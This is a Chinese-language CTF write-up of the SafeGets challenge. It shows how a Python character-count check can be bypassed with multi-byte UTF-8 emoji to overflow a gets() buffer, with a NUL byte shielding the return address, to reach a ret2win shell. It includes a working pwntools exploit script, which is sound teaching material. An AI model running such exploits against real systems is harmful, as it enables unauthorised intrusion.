# L3akCTF 2025 SafeGets Writeup

## 题目简述

SafeGets 尝试在危险的 `gets()` 外包一层 Python 长度检查：服务端只允许输入至多 255 个“字符”，再把字符串编码后交给 C 程序。问题在于 Python 的 `len(str)` 统计 Unicode 码点，而 UTF-8 编码后一个字符可能占多个字节。利用这个字符数与字节数的差异，可以越过包装器限制，覆盖返回地址并跳转到 `win()`。

## 解题过程

### 检查二进制与包装器

二进制为 amd64、No PIE、NX，且没有栈 canary。主函数的核心代码为：

```c
char buf[0x100];
gets(buf);

int len = strlen(buf);
for (size_t i = 0; i < len / 2; i++) {
    char temp = buf[len - 1 - i];
    buf[len - 1 - i] = buf[i];
    buf[i] = temp;
}
```

包装器的检查则是：

```python
payload = input("Enter your input (max 255 bytes): ")
if len(payload) > 0xff:
    sys.exit(1)

proc.stdin.write(payload.encode() + b"\n")
```

提示写的是 bytes，实际检查的却是 Unicode 字符数量。比如 `😁` 在 Python 字符串中长度为 1，UTF-8 编码后为：

```text
f0 9f 98 81
```

即 4 字节。因此 64 个 emoji 只计 64 个字符，却会向 `gets()` 送入 $64 \times 4 = 256$ 字节。

### 确定覆盖偏移

反汇编可见 `buf` 位于 `rbp-0x110`，因此从缓冲区起点到保存的返回地址共：

```text
0x110 + 8 = 0x118
```

前 256 字节由 emoji 编码填满，之后再补 `0x18` 字节即可到达保存的 RIP。题目所附二进制中，`win()` 位于 `0x401262`：

```asm
401262: endbr64
401266: push rbp
401267: mov rbp, rsp
40126a: lea rax, ["/bin/sh"]
401274: call system
```

官方利用跳到 `0x401267`，跳过函数开头的 `push rbp`，使后续 `system()` 调用保持合适的栈对齐。

### 避免反转过程破坏返回地址

C 程序在溢出后还会用 `strlen()` 计算长度并反转字符串。如果让它把整个 payload 都纳入长度，返回地址也会被交换破坏。

解决方法是在 256 字节 emoji 数据后立即放置 NUL。`strlen()` 因此只返回 `0x100`，反转循环只修改前 256 字节；NUL 后的填充和返回地址保持不变。

完整 payload 为：

```python
from pwn import *

io = remote("challenge.host", 5000)

payload = (
    "😁".encode() * (0x100 // 4)
    + b"\x00" * 0x18
    + p64(0x401267)
)

io.sendline(payload)
io.interactive()
```

从 Python 字符串的视角看，这些内容仍少于 255 个字符；编码后却有足够字节覆盖 RIP。`win()` 启动 shell 后读取 flag：

```bash
cat flag.txt
```

得到：

```text
L3AK{6375_15_4pp4r3n7ly_n3v3r_54f3}
```

上述 payload 已在仓库所附本地二进制上验证，能够进入 shell 并输出同一 flag。

## 方法总结

本题不是简单地指出 `gets()` 不安全，还要求突破其外层的错误长度校验。处理跨语言输入时，必须区分字符数、码点数、编码单元数和最终字节数；安全边界若按字符检查、按字节写入，就可能被多字节编码放大。

利用中还要考虑溢出后的数据处理。这里通过在准确位置放置 NUL，让 `strlen()` 和反转循环只作用于无关的前半部分，从而保护已经布置好的返回地址。最终形成“Unicode 长度错配 → 栈溢出 → NUL 截断后处理 → ret2win”的完整链条。
